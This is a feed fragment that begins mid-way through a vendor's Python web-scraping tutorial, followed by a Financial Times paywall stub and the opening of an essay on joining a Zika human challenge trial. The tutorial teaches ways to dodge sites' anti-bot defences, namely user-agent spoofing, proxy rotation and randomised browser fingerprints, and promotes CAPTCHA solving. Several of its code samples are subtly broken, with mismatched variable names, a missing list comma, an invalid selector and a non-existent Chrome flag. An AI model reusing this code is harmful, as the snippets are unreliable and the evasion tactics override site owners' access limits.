</code></pre></div><p><span>The imports include standard Python libraries that provide HTTP requests functionality (</span><span><ccode>requests</ccode></span><span>), parsing capability (</span><span><ccode>BeautifulSoup</ccode></span><span>), and file system access (</span><span><ccode>os</ccode></span><span>) which we will leverage.</span></p><p><span>The </span><span><ccode>requests</ccode></span><span> library allows us to make HTTP requests to the web page and check if the response is valid before parsing. </span><span><ccode>BeautifulSoup</ccode></span><span> then enables us to parse the full HTML content and isolate the main data table using CSS selectors. Finally, </span><span><ccode>os</ccode></span><span> provides file system access to save images locally.</span></p><p><span>Together they form a very handy toolkit for scraping!</span></p><h2><span><strong>Downloading the page</strong></span></h2><p><span>We first construct the target URL and initialize a requests </span><span><ccode>Session</ccode></span><span> which allows connection reuse and efficiencies when making multiple HTTP requests to the same domain:</span></p><div><pre><code>url = '&lt;https://commons.wikimedia.org/wiki/List_of_dog_breeds&gt;'

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}

response = requests.get(url, headers=headers)
</code></pre></div><p><span>We also setup a custom </span><span><ccode>User-Agent</ccode></span><span> HTTP header to masquerade as a Chrome browser. This helps avoid blocks from servers trying to prevent scraping.</span></p><p><span>After getting the response, we can check the status code to ensure we received a proper HTML document:</span></p><div><pre><code>if response.status_code == 200:
   # Success!
   print(response.text)
</code></pre></div><p><span>In case of errors (e.g. 404 or 500), we do not proceed with scraping and handle the failure.</span></p><h2><span><strong>Parsing the html</strong></span></h2><p><span>Since we received a valid HTML response, we can parse the text content using Beautiful Soup:</span></p><div><pre><code>soup = BeautifulSoup(response.text, 'html.parser')
</code></pre></div><p><span><ccode>BeautifulSoup</ccode></span><span> accepts the raw HTML text and an optional parser like </span><span><ccode>lxml</ccode></span><span> or the built-in </span><span><ccode>html.parser</ccode></span><span>, and provides simple methods and Pythonic idioms for navigating, searching, and modifying the parse tree.</span></p><p><span>Beautiful Soup transforms the messy HTML into a parse tree that mirrors the DOM structure of tags, attributes and text. We can use CSS selectors and traversal methods to quickly isolate the data we need from this tree.</span></p><h2><span><strong>The Magic of Selectors for Data Extraction</strong></span></h2><p><span>One of the most magical parts of web scraping with Python's BeautifulSoup library is using CSS selectors to extract specific content from HTML pages.</span></p><p><span>Selectors allow us to visually target the tags enclosing the data we want scraped. BeautifulSoup makes selecting elements a breeze.</span></p><p><span>For example, consider extracting book titles from this snippet:</span></p><div><pre><code>&lt;div class="book-listing"&gt;
  &lt;img src="/covers/harry-potter.jpg"&gt;
  &lt;span class="title"&gt;Harry Potter and the Goblet of Fire&lt;/span&gt;
  &lt;span class="rating"&gt;9.1&lt;/span&gt;
&lt;/div&gt;

&lt;div class="book-listing"&gt;
  &lt;img src="/covers/lord-of-the-rings.jpg"&gt;
  &lt;span class="title"&gt;The Fellowship of the Ring&lt;/span&gt;
  &lt;span class="rating"&gt;9.3&lt;/span&gt;
&lt;/div&gt;
</code></pre></div><p><span>We can directly target the </span><span><ccode>span</ccode></span><span> with class </span><span><ccode>title</ccode></span><span> through the CSS selector:</span></p><div><pre><code>soup.select("div.book-listing &gt; span.title")
</code></pre></div><p><span>This says - find all </span><span><ccode>span</ccode></span><span> tags having class </span><span><ccode>title</ccode></span><span> which are direct children of any </span><span><ccode>div</ccode></span><span> tag having </span><span><ccode>book-listing</ccode></span><span> as the CSS class.</span></p><p><span>And voila, we have exactly the titles isolated:</span></p><div><pre><code>[&lt;span class="title"&gt;Harry Potter and the Goblet of Fire&lt;/span&gt;,
 &lt;span class="title"&gt;The Fellowship of the Ring&lt;/span&gt;]
</code></pre></div><p><span>We can chain </span><span><ccode>.text</ccode></span><span> to extract just the readable text within the tags:</span></p><div><pre><code>[Harry Potter and the Goblet of Fire, The Fellowship of the Ring]
</code></pre></div><p><span>Selectors provide incredible precision during data extraction by leveraging the innate hierarchy of structured HTML tags surrounding it.</span></p><p><span>Some other examples of selectors:</span></p><div><pre><code># Select id attribute
soup.select("#book-title")

# Attribute equality match
soup.select('a[href="/login"]')

# Partial attribute match
soup.select('span[class^="title"]')

# Select direct descendant
soup.select("ul &gt; li")
</code></pre></div><p><span>As you can see, by mastering different selector types and combining multiple selectors where needed - you gain immense power to zone in on and extract the exact data you need from any HTML document, eliminating nearly all guesswork. Lets get back to the task at hand now…</span></p><h2><span><strong>Finding the table</strong></span></h2><img src="https://proxiesapi.com/articles/images/65d4bf9f4fbdb.jpg" alt=""><p><span>Looking at the Raw HTML, we notice a </span><span><ccode>table</ccode></span><span> tag with CSS class </span><span><ccode>wikitable sortable</ccode></span><span> contains the main breed data.</span></p><p><span>We can simply select this using:</span></p><div><pre><code>table = soup.find('table', {'class': 'wikitable sortable'})
</code></pre></div><p><span>This searches the parse tree for any </span><span><ccode>table</ccode></span><span> tag having a </span><span><ccode>class</ccode></span><span> attribute matching </span><span><ccode>wikitable sortable</ccode></span><span>. Beautiful soup makes Selection using CSS selectors super easy!</span></p><h2><span><strong>Extracting all the fields</strong></span></h2><p><span>With the table isolated, we loop through every </span><span><ccode>tr</ccode></span><span> row after the header row to extract the data from each breed:</span></p><div><pre><code>for row in table.find_all('tr')[1:]:

    columns = row.find_all(['td', 'th'])

    name = columns[0].find('a').text.strip()
    group = columns[1].text.strip()
</code></pre></div><p><span>Here, </span><span><ccode>.find_all()</ccode></span><span> helps search all the row children tags for any </span><span><ccode>td</ccode></span><span> or </span><span><ccode>th</ccode></span><span> elements, which represent table cells. We select these into a list </span><span><ccode>columns</ccode></span><span>.</span></p><p><span>Using positional indexes in this columns list, we can extract the data within each cell cleanly:</span></p><div><pre><code>    name = columns[0].find('a').text.strip()
</code></pre></div><p><span>This grabs the anchor </span><span><ccode>a</ccode></span><span> tag inside the first table cell, gets </span><span><ccode>.text</ccode></span><span> property to extract raw string content and chains </span><span><ccode>.strip()</ccode></span><span> to remove whitespace. Beautiful Soup chains such operations elegantly.</span></p><p><span>Similarly for cells containing just text:</span></p><div><pre><code>    group = columns[1].text.strip()
</code></pre></div><p><span>We fetch </span><span><ccode>.text</ccode></span><span> property directly on table cell element.</span></p><p><span>The power of CSS selectors in quickly isolating specific tags, ids, classes or attributes makes data extraction very precise and straightforward in Beautiful Soup.</span></p><h2><span><strong>Downloading and saving the images</strong></span></h2><p><span>After scraping textual data like names, groups etc in each row, we check the last cell for an image link:</span></p><div><pre><code>    img_tag = columns[3].find('img')
    photograph = img_tag['src'] if img_tag else ''
</code></pre></div><p><span>This tries detecting and fetching src attribute on any image tag if exists.</span></p><p><span>We can then download and save images using this url if present:</span></p><div><pre><code>    if photograph:

        response = requests.get(photograph)

        image_filename = os.path.join('dog_images', f'{name}.jpg')

        with open(file_path, 'wb') as img_file:
           img_file.write(response.content)
</code></pre></div><p><span>We reuse the </span><span><ccode>requests</ccode></span><span> library to make another GET request - this time to download the image binary content and save it locally using built-in file handling capability. Pretty nifty!</span></p><p><span>And that's it! By using </span><span><ccode>requests</ccode></span><span> and BeautifulSoup together with Python's intuitive standard library, we were able to build a complete web scraper to extract complex data!</span></p><h2><span><strong>Alternative libraries and tools for web scraping</strong></span></h2><p><span>While requests and BeautifulSoup form the most popular combination, here are some alternatives worth considering:</span></p><p><span><strong>Scrapy</strong></span></p><p><span>An open source modular scraping framework meant for large scale crawling that handles throttling, cookies, proxy rotation automatically. Recommended for complex needs.</span></p><p><span><strong>Selenium</strong></span></p><p><span>Performs actual browser automation by controlling Chrome, Firefox etc. Enables scraping dynamic content that renders via JavaScript. More complex setup.</span></p><p><span><strong>pyppeteer</strong></span></p><p><span>Headless browser automation like Selenium driven through Python code. Good for javascript rendered websites.</span></p><p><span><strong>pyquery</strong></span></p><p><span>Offers jQuery style element selection. Scrape code looks very clean due to chaining syntax similar to jQuery.</span></p><p><span><strong>lxml</strong></span></p><p><span>A very fast XML/HTML parser. Great when raw parsing performance is critical.</span></p><h2><span><strong>Challenges of Web Scraping in the real world: Some tips &amp; best practices</strong></span></h2><p><span>While basic web scraping is easy, building robust production-grade scalable crawlers brings its own challenges:</span></p><h3><span><strong>Handling Dynamic Content</strong></span></h3><p><span>Many websites rely heavily on JavaScript to render content dynamically. Static scraping then fails. </span><span><strong>Solutions:</strong></span><span> Use browser automation tools like Selenium or scraper specific solutions like Scrapy's splash integration.</span></p><p><span>Here is a simple Hello World example to handle dynamic content using Selenium browser automation:</span></p><div><pre><code>from selenium import webdriver
from selenium.webdriver.common.by import By

# Initialize chrome webdriver
driver = webdriver.Chrome()

# Load page
driver.get("&lt;https://example.com&gt;")

# Wait for title to load from dynamic JS execution
driver.implicitly_wait(10)

# Selenium can extract dynamically loaded elements
print(driver.title)

# Selenium allows clicking buttons triggering JS events
driver.find_element(By.ID, "dynamicBtn").click()

# Inputs can be handled as well
search = driver.find_element(By.NAME, 'search')
search.send_keys('Automate using Selenium')
search.submit()

# Teardown browser after done
driver.quit()
</code></pre></div><p><span>The key capabilities offered by Selenium here are:</span></p><ol><li><span>Launches a real Chrome browser to load JavaScript</span></li><li><span>Finds elements only available after execution of JS</span></li><li><span>Can interact with page by clicking, entering text etc thereby triggering JavaScript events</span></li><li><span>Experience mimics an actual user browsing dynamically generated content</span></li></ol><p><span>Together this allows handling complex sites primarily driven by JavaScript for dynamic content. Selenium provides full programmatic control to automate browsers directly thereby scraping correctly.</span></p><h3><span><strong>Getting Blocked</strong></span></h3><p><span>Websites often block scrapers via blocked IP ranges or blocking characteristic bot activity through heuristics. </span><span><strong>Solutions:</strong></span><span> Slow down requests, properly mimic browsers, rotate user agents and proxies.</span></p><p><span><strong>Rate Limiting</strong></span></p><p><span>Servers fight overload by restricting number of requests served per time. Hitting these limits lead to temporary bans or denied requests. </span><span><strong>Solutions:</strong></span><span> Honor crawl delays, use proxies and ration requests appropriately.</span></p><p><span>Here is sample code to handle rate limiting while scraping:</span></p><p><span>Many websites have protection mechanisms that temporarily block scrapers when they detect too many frequent requests coming from a single IP address.</span></p><p><span>We can counter getting blocked by rate limits by adding throttling, proxies and random delays in our code.</span></p><div><pre><code>import time
import random
import requests
from urllib.request import ProxyHandler, build_opener

# List of free public proxies
PROXIES = ["104.236.141.243:8080", "104.131.178.157:8085"]

# Pause 5-15 seconds between requests randomly
def get_request():
    time.sleep(random.randint(5, 15))
    proxy = random.choice(PROXIES)
    opener = build_opener(ProxyHandler({'https': proxy}))

    resp = opener.open("&lt;https://example.com&gt;")
    return resp

for i in range(50):
   response = get_request()
   print("Request Success")
</code></pre></div><p><span>Here each request first waits for a random interval before executing. This prevents continuous rapid requests.</span></p><p><span>We also route every alternate request through randomly chosen proxy servers via rotated IP addresses.</span></p><p><span>Together, throttling down overall crawl pace and distributing requests over different proxy IPs prevents hitting site-imposed rate limits.</span></p><p><span>Additional improvements like automatically detecting rate limit warnings in responses and reacting accordingly can enhance the scraper's resilience further.</span></p><h3><span><strong>Rotating User Agents</strong></span></h3><p><span>Websites often try to detect and block scraping bots by tracking characteristic user agent strings.</span></p><p><span>To prevent blocks, it is good practice to rotate multiple well-disguised user agents randomly to mimic a real browser flow.</span></p><p><span>Here is sample code to pick a random desktop user agent from a predefined list using Python's random library before making each request:</span></p><div><pre><code>import requests
import random

# List of desktop user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
]

# Pick a random user agent string
user_agent = random.choice(user_agents)

# Set request headers with user agent before making request
headers = {"User-Agent": user_agent}

response = requests.get(url, headers=headers)
</code></pre></div><p><span>By varying the user agent across requests in code runs, websites have a tougher time profiling traffic as coming from an automated bot using a static user agent. This allows the scraper to fly under the radar without getting blocked.</span></p><p><span>Some additional enhancements include:</span></p><li><span>Having separate user agent lists for mobile, tablets, desktop browsers</span></li><li><span>Updating the lists with latest user agents periodically</span></li><li><span>Dynamically generating user agents to match genuine browser attributes</span></li><p><span>With effective user agent rotation and an ever expanding list of strings, scrapers enjoy better longevity undetected before site administrators can profile and actively block them.</span></p><h3><span><strong>Browser Fingerprinting</strong></span></h3><p><span>Beyond simplistic user agent checks, websites have adopted advanced browser fingerprinting techniques to identify bots.</span></p><p><span>This involves browser attribute profiling - collecting information regarding device screen size, installed fonts, browser plugins etc. together called browser fingerprints.</span></p><p><span>These fingerprints tend to remain largely consistent, stable and unique for standard tool-based bots and automation software.</span></p><p><span>Dynamic websites track fingerprints of scrapers accessing them. By detecting known crawler fingerprints they can block them even if the user agents are rotated constantly.</span></p><p><span><strong>Minimizing detection risks</strong></span></p><p><span>Some ways to minimize exposing scraper fingerprints:</span></p><li><span>Use Selenium to automate a standard desktop browser like Chrome or Firefox instead of custom bot agents</span></li><li><span>Dynamically generate randomized attributes like viewport size, screen resolution, font lists within ranges of variety exhibited by human browsers</span></li><li><span>Utilize proxy rotation and residential IP proxies to prevent tracking of IP specific attributes</span></li><li><span>Limit number of parallel requests from a single proxy to site to make traffic volume seem manual</span></li><p><span>Essentially by mimicking the natural randomness and variability across genuine user browsers, scraper fingerprints can avoid easy profiling by sites simply as another standard browser.</span></p><p><span>Here is a code example to dynamically modify browser attributes to avoid fingerprinting:</span></p><div><pre><code>from selenium import webdriver
import random

# List of common screen resolutions
screen_res = [(1366, 768), (1920, 1080), (1024, 768)]

# List of common font families
font_families = ["Arial", "Times New Roman", "Verdana"]

#Pick random resolution
width, height = random.choice(screen_res)

#Create chrome options
opts = webdriver.ChromeOptions()

# Set random screen res
opts.add_argument(f"--window-size={width},{height}")

# Set random user agent
opts.add_argument("--user-agent=Mozilla/5.0...")

# Set random font list
random_fonts = random.choices(font_families, k=2)
opts.add_argument(f'--font-list="{random_fonts[0]};{random_fonts[1]}"')

# Initialize driver with options
driver = webdriver.Chrome(options=opts)

# Access webpage
driver.get(target_url)

# Webpage sees every scraper request originating
# from distinct unpredictable browser profiles

</code></pre></div><p><span>Here we randomly configure our Selenium controlled Chrome instance with different screen sizes, user agents and font sets per request.</span></p><p><span>and here is how you do it using <a href="https://proxiesapi.com/articles/using-proxies-with-python-requests">Python Requests</a>…</span></p><div><pre><code>import requests
import random

# Device profiles
desktop_config = {
    'user-agent': 'Mozilla/5.0...',
    'accept-language': ['en-US,en', 'en-GB,en'],
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'accept-encoding': 'gzip, deflate, br',
    'upgrade-insecure-requests': '1',
    'sec-fetch-site': 'none',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'cache-control': 'max-age=0'
}

mobile_config = {
    'user-agent': 'Mozilla/5.0... Mobile',
    'accept-language': ['en-US,en', 'en-GB,en'],
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'referer': '&lt;https://www.example.com/&gt;',
    'accept-encoding': 'gzip, deflate, br',
    'cache-control': 'max-age=0'
}

device_profiles = [desktop_config, mobile_config]

def build_headers():

    profile = random.choice(device_profiles)

    headers = {
         'User-Agent': random.choice(profile['user-agent']),
         'Accept-Language': random.choice(profile['accept-language']),
         # Other headers
         ...
    }

    return headers
</code></pre></div><p><span>Now instead of hard coding, the scraper randomly selects from plausible configuration profiles including several identifying request headers - providing realistic and human-like mutations necessary to avoid fingerprint tracking.</span></p><h3><span><strong>Parsing Complex HTML</strong></span></h3><p><span>Scrape targets often have complex HTML structures, obfuscated tags and advanced client side code packing logic which break parsers. </span><span><strong>Solutions</strong></span><span>: Careful inspection of rendered source, using robust parsers like lxml and enhancing selectors.</span></p><p><span>Here are some common types of bad HTML scrape targets exhibit and techniques to handle them:</span></p><p><span><strong>Improper Nesting</strong></span></p><p><span>HTML can often have incorrectly nested tags:</span></p><div><pre><code>&lt;b&gt;Latest News &lt;p&gt;Impact of oil prices fall...&lt;/b&gt;&lt;/p&gt;
</code></pre></div><p><span><strong>Solution</strong></span><span>: Use a parser like </span><span><em>lxml</em></span><span> that handles bad nesting and uneven tags more robustly.</span></p><p><span><strong>Broken Markup</strong></span></p><p><span>Tags could be unclosed:</span></p><div><pre><code>&lt;div&gt;
  &lt;span class="title"&gt;Python Web Scraping &lt;span&gt;
  Lorem ipsum...
&lt;/div&gt;
</code></pre></div><p><span><strong>Solution</strong></span><span>: Specify tag close explicitly while parsing:</span></p><div><pre><code>title = soup.find("span", class_="title").text
</code></pre></div><p><span><strong>Non-standard Elements</strong></span></p><p><span>Vendor specific unrecognized custom tags may exist:</span></p><div><pre><code>&lt;album&gt;
  &lt;cisco:song&gt;Believer&lt;/cisco:song&gt;
&lt;/album&gt;
</code></pre></div><p><span><strong>Solution</strong></span><span>: Search for standard tags in namespace:</span></p><div><pre><code>song = soup.find("cisco:song").text
</code></pre></div><p><span><strong>Non-text Content</strong></span></p><p><span>Tables, images embedded between text tags:</span></p><div><pre><code>&lt;p&gt;
  Trending Now
  &lt;table&gt;...&lt;/table&gt;
&lt;/p&gt;
</code></pre></div><p><span><strong>Solution</strong></span><span>: Select child tags specifically:</span></p><div><pre><code>paras = soup.select("p &gt; text()")
</code></pre></div><p><span>This picks only text nodes as children ignoring other elements present under </span><span><ccode></ccode></span></p><p><span> tag.</span></p><p><span>As you can see, liberal use of selectors along with robust parsers provides the tools to handle even badly designed HTML and extract the required data reliably.</span></p><h3><span><strong>Other guidelines worth following:</strong></span></h3><li><span>Respect </span><span><ccode>robots.txt</ccode></span><span> rules</span></li><li><span>Check if API access is available before scraping sites without permission</span></li><li><span>Scrape data responsibly in moderate volumes</span></li><p><span>Adopting these practices ensures reliable, resilient and responsible scraping operations.</span></p><p><span><strong>Conclusion</strong></span><span>
In this comprehensive guide, we took an in-depth look into web scraping using Python. We covered:</span></p><li><span>Why Python and libraries like BeautifulSoup are ideal for scraping most targets</span></li><li><span>Common scraping patterns like making requests, parsing responses, handling dynamic content using Selenium</span></li><li><span>Best practices around mimicry, circumventing blocks, respecting crawl delays and auto-throttling</span></li><li><span>How to build resilient, production-grade scalable scrapers</span></li><p><span>By learning core scraping paradigms, structuring code properly and applying optimization techniques, extracting accurate web data in Python at scale has become an achievable skill!</span></p><p><span>While these examples are great for learning, scraping production-level sites can pose challenges like CAPTCHAs, IP blocks, and bot detection. Rotating proxies and automated CAPTCHA solving can help.</span></p><p><span>Proxies API offers a simple API for rendering pages with built-in proxy rotation, CAPTCHA solving, and evasion of IP blocks. You can fetch rendered pages in any language without configuring browsers or proxies yourself.</span></p><p><span>This allows scraping at scale without headaches of IP blocks. Proxies API has a free tier to get started. Check out the API and</span><a href="https://proxiesapi.com/">&nbsp;sign up for an API key</a><span>&nbsp;to supercharge your web scraping.</span></p><p><span>With the power of Proxies API combined with Python libraries like Beautiful Soup, you can scrape data at scale without getting blocked.</span></p>      

    
    
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Bad property debt exceeds reserves at largest US banks (170 pts)]]></title>
            <link>https://www.ft.com/content/4114454c-a924-4929-85f4-5360b2b871c6</link>
            <guid>39441115</guid>
            <pubDate>Tue, 20 Feb 2024 13:43:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ft.com/content/4114454c-a924-4929-85f4-5360b2b871c6">https://www.ft.com/content/4114454c-a924-4929-85f4-5360b2b871c6</a>, See on <a href="https://news.ycombinator.com/item?id=39441115">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="barrier-page">
<div data-component="articleHeaderHeroRadioOffer" data-component-unique-name="CHE-Print"><div><p><img src="https://financial-times-financial-times.cdn.zephr.com/assets/icons/padlock_icon.svg" alt="Padlock icon"></p><div><p>Subscribe to unlock this article</p></div></div><div><p><h2>Limited time offer
  <br>
  <strong>Save up to 40% on Standard Digital</strong>
</h2></p><div><p> Essential digital access to quality FT journalism on any device. <br>
All discounts based on monthly full price over contract term. Cancel subscription renewal anytime. </p></div></div><div><div><p><label for="offer1"><label for="offer1">
  <span>SAVE 40% ON YEAR 1</span>
  <span>
    <s>CHF660</s> CHF395 for 1 year
  </span>
  <span>CHF32.92 monthly equivalent</span>
</label></label></p></div><div><p><label for="offer2"><label for="offer2">
  <span>SAVE 25% ON 6 MONTHS</span>
  <span>
    <s>CHF330</s> CHF245 for 6 months
  </span>
  <span>CHF40.83 monthly equivalent</span>
</label></label></p></div><div><p><label for="offer3"><label for="offer3">
  <span>SAVE 10% MONTHLY</span>
  <span>
    <s>CHF55</s> CHF49 per month
  </span>
  <span>Up to 12 months</span>
</label></label></p></div></div></div>
<div id="recommendedOffers-CHE-Print-8b5821ed-6e43-4acd-9b78-bc193719aca5" data-component="recommendedOffers" data-component-unique-name="CHE-Print"><h2>Explore more offers.</h2><div><div data-o-grid-colspan="12 L4"><div><p><img src="https://financial-times-financial-times.cdn.zephr.com/assets/icons/primary_product_icon_trial.svg" alt=""></p><p data-offer-type="trial"><h3>Standard Digital</h3></p></div><div><p>Then CHF85 per month. Complete digital access to quality FT journalism on any device. Cancel anytime during your trial.</p></div></div><div data-o-grid-colspan="12 L4"><div><p><img src="https://financial-times-financial-times.cdn.zephr.com/assets/icons/primary_product_icon_premium.svg" alt=""></p><p data-offer-type="premium"><h3>Standard Digital</h3></p></div><div><p>Complete digital access to quality FT journalism with expert analysis from industry leaders. Pay a year upfront and save 20%.</p></div></div><div data-o-grid-colspan="12 L4"><div><p><img src="https://financial-times-financial-times.cdn.zephr.com/assets/icons/primary_product_icon_print.svg" alt=""></p><p data-offer-type="print"><h3>Standard Digital</h3></p></div><div><p><span>CHF1,349</span><span> CHF345 </span><span>for your first year</span></p></div><div><p>Insight and expertise in your hands with the iconic FT print edition, delivered Monday to Saturday.</p></div></div></div></div>
<div data-component="subscriptionOptionsV2" data-component-unique-name="CHE-Print"><h2>Explore our full range of subscriptions.</h2></div>
<div data-component="whyFT" data-component-unique-name="default"><div><h2>Why the FT?</h2><p>See why over a million readers pay to read the Financial Times.</p></div><p><a href="https://subs.ft.com/whytheft">Find out why</a></p></div>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I was deliberately infected with Zika to test a vaccine (128 pts)]]></title>
            <link>https://worksinprogress.co/issue/life-in-the-time-of-zika/</link>
            <guid>39441088</guid>
            <pubDate>Tue, 20 Feb 2024 13:40:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://worksinprogress.co/issue/life-in-the-time-of-zika/">https://worksinprogress.co/issue/life-in-the-time-of-zika/</a>, See on <a href="https://news.ycombinator.com/item?id=39441088">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>I was deliberately infected with Zika to test a vaccine. Human challenge trials like my one could save millions of lives by developing prophylactics more quickly.</p><article><div role="presentation"><p>It started, as good things rarely do, with a <!-- --><s>tweet</s> X: there was a human ​challenge trial looking for healthy men, 18–40, near me. Previously, I had worked for <!-- --><a href="https://www.1daysooner.org/">1Day Sooner</a>, an organization that advocates for the right of volunteers to participate in human challenge trials, so it felt only fair that I should take part in one myself. Well, I was a man 18–40, of sound body and nominally sound mind. I signed up.<!-- --></p>



<!-- --><p>Challenge trials were a subject of intense controversy during the Covid-19 pandemic. It’s easy to see why: challenge trials involve attempting to deliberately infect the subjects with the disease in question. Malaria challenge trials used to close volunteers into <!-- --><a href="https://worksinprogress.co/issue/why-we-didnt-get-a-malaria-vaccine-sooner">rooms with hundreds of malarial mosquitoes</a>, which was as pleasant as it sounds. (They’ve since begun to use a small box of mosquitoes with a hole for your arm – or a syringe). This may seem like a violation of the most basic principle of medicine, the idea that you’re supposed to heal people, not hurt them. But without deliberate, controlled, and monitored infections, scientists are forced to rely on studying wild infections – which means many more patients need to be infected (and harmed or even possibly killed) to provide the same quality of data that a human challenge trial could collect.<!-- --></p>



<!-- --><p>Of those people who are exposed in the wild, many of them may be reluctant to participate in a study, or they may only show up once symptoms begin and it’s too late to study the disease’s earliest stages. Before a treatment is shown to be good enough, ethicists worry that patients could be unethically pressured into ineffective trials – but once a good enough treatment is identified, doctors may be obliged to give it to everyone who needs it, making it impossible to study other treatments or even maintain a control group. On top of that, prospective participants who do become sick don’t necessarily want to sign up for all the poking and prodding that scientists would like to do.</p>



<!-- --><p>Toward the end of the screening call for the trial I had applied to, I was asked if I had any questions or safety concerns about getting Zika virus. I didn’t know anything about Zika other than that it was probably a neglected tropical disease and causes birth defects. But, during my previous work, I had published a <!-- --><a href="https://academic.oup.com/cid/article/76/4/609/6758436">meta-analysis</a> on the safety of human challenge trials in general, and knew that severe <!-- --><a href="https://oig.hhs.gov/reports-and-publications/featured-topics/adverse-events/">adverse events</a>, the medical term for bad things, were extremely rare in such trials.<!-- --></p>



<!-- --><p>As it turns out, this was broadly correct. Zika is a <!-- --><em>Flaviviridae</em>-family virus, like Dengue or yellow fever. It was first isolated in the Zika forest of Uganda in 1947. At the time, America had bigger problems – especially the natural outbreak of smallpox two years later. But the year-old CDC (Centers for Disease Control and Prevention) tracked it, and tried to ​understand more about it. Zika wouldn’t have an outbreak among humans until 2007, so it stayed a fairly low priority. It almost never kills, after all.<!-- --></p>



<!-- --><p>The primary reason that we care about Zika is that if someone is ​infected while pregnant then their baby can be born with microcephaly. Microcephaly, abnormal smallness of the head, is a fairly serious birth defect, the kind that can lead to lifelong medical issues. But for those of us who aren’t currently pregnant, getting Zika is not too scary. The advice the CDC gives for those who are infected is pretty basic: sleep, fluids, ​acetaminophen (paracetamol), and if you’re taking meds for something else already, talk to a doctor. About what my mother would advise for a cold. As a mild spoiler, Zika is somewhat worse than the average cold.</p>



<!-- --><p>Given how much the CDC makes Zika sound like a cold – for those who aren’t pregnant – I wasn’t too concerned about getting it. My lack of concern would continue through my first, second, and third screenings. Each time I would fill out an informed consent form that tested my ability to understand that I would receive no ‘direct benefits’ from the study – ​except for $4,875 in cash. Many bioethicists are worried about cash ​compensation, seeing it as coercive to offer people ‘too much’ money to do something, and this is presumably related. A common approach is to not offer any compensation for getting ill, but instead only for time and travel: in this framing the money isn’t for doing the study itself. Later, the joys of bureaucracy created an unexpected delay in payment, which didn’t cause me issues – I’m a graduate student used to inconsistent income, so I keep a pot of savings to cover the wait for expense reimbursements – but I wonder why the bioethicists aren’t concerned about whether I needed that check to make rent.</p>



<!-- --><p>During these screenings I learned that I was allowed to receive Zika and immediately quit the study and walk out the door – and, if I wanted, to get on a plane. While I appreciate my freedoms as an American, I’m not sure I should be legally able to start a Zika outbreak in my choice of preferred metropolitan areas.</p>



<!-- --><p>I confirmed that I understood that drawing blood might result in pain. ​I misread that I would spend my seven days wearing blue hospital scrubs, mistaking an option for a requirement. I listed on my Comprehension Assessment Quiz that the reason that some trial subgroups would have mosquitoes feed on their arms was to study mosquito transmission (shocking, I know), but until after I was actually enrolled I didn’t understand what time of the day I would be let out or what medicine I might want to have prepared for when I returned home with a rash.<!-- --><sup id="ref-1"></sup></p>



<!-- --><p>At times it seems that there was a distinction between concerns where my informed consent was treated as sacred and other concerns that nobody has bothered to think about, and the distinction was decided by a drunk rolling dice.</p>



<!-- --><hr>



<!-- --><p>There are five major ways to deal with infections.</p>



<!-- --><p>Ideally, we’d prevent the infection from occurring, from making the jump to humans, or even from existing in the first place. We can invest in ​adequate sanitation, so people aren’t infected by the water they drink. We can educate people about cooking food at temperatures high enough to break down pathogens. We can ban the sale of bat meat, a notorious source of disease. Dogs with rabies are euthanized, and people fought the Black Death by killing rats (though that <!-- --><a href="https://www.gavi.org/vaccineswork/black-death-may-not-have-been-spread-rats-after-all">may not have worked</a>). In the modern era, the most exciting approach is gene drives. Using CRISPR and other genetic-modification techniques, it is possible to make a particular piece of genetic code be passed down 100 percent of the time, rather than merely 50. By additionally making all children male, a species with a short life span (such as a malarial mosquito) could be driven to extinction relatively rapidly.<!-- --></p>



<!-- --><p>Once it’s too late to prevent an infection occurring in humans, we can still try to contain it and prevent further spread. Nonpharmaceutical interventions like masks, handwashing, and quarantines prevent the infection of others. This was, for decades, our only approach to HIV: encourage people to use condoms, ban men who have sex with men from donating blood, establish needle exchange programs, and look for a better way.<!-- --><sup id="ref-2"></sup> And, of course, there are always salespeople telling you to lose weight or take supplements.<!-- --></p>



<!-- --><p>Once a patient is infected, we can try to cure the disease. Some cures are specific to the disease: we used to <!-- --><a href="https://worksinprogress.co/issue/why-we-didnt-get-a-malaria-vaccine-sooner/">infect people with malaria to cure syphilis</a> – and it worked. There is a wide class of infections that we treat with antibiotics. Agricultural overuse and other factors threaten how ​effective they are, humans develop new antibiotics, and the race goes on. Antibiotics are still great. But they don’t work on viruses, such as Zika – ​and we’re still working on improving access to antibiotics in low- and middle-income countries. For viruses like Zika, we can invent antivirals. But we’re still working on producing ones that work as well on viruses as antibiotics work on bacteria.<!-- --></p>



<!-- --><p>For those we can’t cure, we can treat symptoms. We may not be able to remove the virus causing a cold from your system, but we can give you painkillers for your headache, tissues for your nose, or cough suppressant medicines. It’s not an ideal solution, but it is part of a realistic answer.</p>



